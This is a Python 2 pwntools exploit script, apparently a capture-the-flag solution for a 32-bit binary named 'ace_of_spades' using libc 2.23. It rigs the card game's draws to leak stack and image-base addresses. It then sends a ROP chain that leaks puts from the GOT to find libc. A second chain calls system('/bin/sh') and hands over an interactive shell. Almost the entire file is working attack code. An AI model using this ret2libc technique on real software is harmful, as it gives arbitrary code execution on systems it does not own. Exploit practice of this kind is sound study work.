#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

# context.arch = 'amd64'
context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './ace_of_spades'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *$rebase(0x1268)
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def Draw(): sh.sendlineafter('Your choice: ', '1')
def Discard(): sh.sendlineafter('Your choice: ', '2')
def Fold(): sh.sendlineafter('Your choice: ', '5')
# def Play(): sh.sendlineafter('Your choice: ', '3')
def Show(): 
    sh.sendlineafter('Your choice: ', '4')
    sh.recvuntil('Your hand is:\n')
    result = sh.recvuntil('\x20\n', drop=True)
    # print(result)
    cards = result.split('\x20')
    visual_cards = []
    for v in cards:
        if(v == '\xf0\x9f\x82\xa1'):
            visual_cards += [100]
        else:
            visual_cards +=  [ord(v[3]) % 0x10]

    return visual_cards

amount = {100:1, 1:3, 14:4}

while(True):
    for i in range(14):
        Draw()
    cards = Show()
    if(cards[8] == 1  and cards[7] not in amount.keys()):
        Discard()
        amount[cards[8]] += 1
        break
    Fold()

for i in range(3):
    while(True):
        for i in range(14):
            Draw()
        cards = Show()
        if(cards[8] == 100  and cards[7] not in amount.keys()):
            Discard()
            amount[cards[8]] += 1
            break
        Fold()

for i in range(40):
    while(True):
        for i in range(14):
            Draw()
        cards = Show()
        if(cards[8] in amount.keys() and cards[7] not in amount.keys()):
            Discard()
            amount[cards[8]] += 1
            break

        Fold()
    print(amount)

while(True):
    for i in range(5):
        Draw()
    cards = Show()
    if(cards.count(1) == 1 and cards.count(14) == 1):
        break
    Fold()

sh.sendlineafter('Your choice: ', '3') # Play
sh.recvuntil('Your prize: ')
result = sh.recvuntil('\n')
stack_addr = u32(result[:4])
log.success('stack_addr: ' + hex(stack_addr))
image_base_addr = u32(result[4: 4+4]) - 0x1355
log.success('image_base_addr: ' + hex(image_base_addr))

sh.sendlineafter('Choose: ', '2')
layout = [
    0,
    image_base_addr + elf.plt['puts'],
    image_base_addr + 0x00000b24, # : pop ebp ; ret
    image_base_addr + elf.got['puts'],

    image_base_addr + 0x1094, # push 0 ; call read
    stack_addr - 4,
    0x100
]
sh.send(flat(layout))

sh.sendlineafter('Your choice: ', '6')

result = sh.recvuntil('\n', drop=True)
libc_addr = u32(result[:4]) - libc.symbols['puts']
log.success('libc_addr: ' + hex(libc_addr))

layout = [
    libc_addr + libc.symbols['system'],
    libc_addr + libc.symbols['exit'],
    libc_addr + libc.search('/bin/sh\0').next(),
    0
]
sh.send(flat(layout))

sh.interactive()
clear()